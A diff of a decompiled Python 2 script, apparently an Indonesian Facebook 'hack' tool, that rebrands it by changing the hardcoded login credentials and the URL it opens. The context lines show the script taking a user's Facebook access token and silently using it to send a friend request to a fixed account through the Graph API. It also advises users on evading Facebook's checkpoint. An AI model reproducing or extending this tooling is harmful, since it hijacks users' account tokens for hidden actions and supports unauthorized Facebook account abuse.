@@ -1,6 +1,6 @@
 #decompiled by PDM31
 import os, sys
-print '\x1b[1;32mMasukan ID: Borot dan Password: indoxploit untuk Login dan jangan lupa login facebook di OperaMini dulu sebelum login agar tidak CekPoint'
+print '\x1b[1;32mMasukan ID: scr dan Password: ruokff untuk Login dan jangan lupa login facebook di OperaMini dulu sebelum login agar tidak CekPoint'
 print '\x1b[1;32mSilahkan Login '
 import os, sys
 
@@ -16,7 +16,7 @@ def restart():
 user = raw_input('ID: ')
 import getpass
 sandi = raw_input('Password: ')
-if sandi == 'indoxploit' and user == 'Borot':
+if sandi == 'ruokff' and user == 'scr':
     print 'Anda Telah Login'
     sys.exit
 else:
@@ -129,7 +129,7 @@ def login():
                 zedd.close()
                 print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin berhasil'
                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
-                os.system('xdg-open https://indoxploit/hack-facebook/')
+                os.system('xdg-open https://Rezahsyim/hackefbeh/')
                 time.sleep(2)
                 menu()
             except requests.exceptions.ConnectionError:
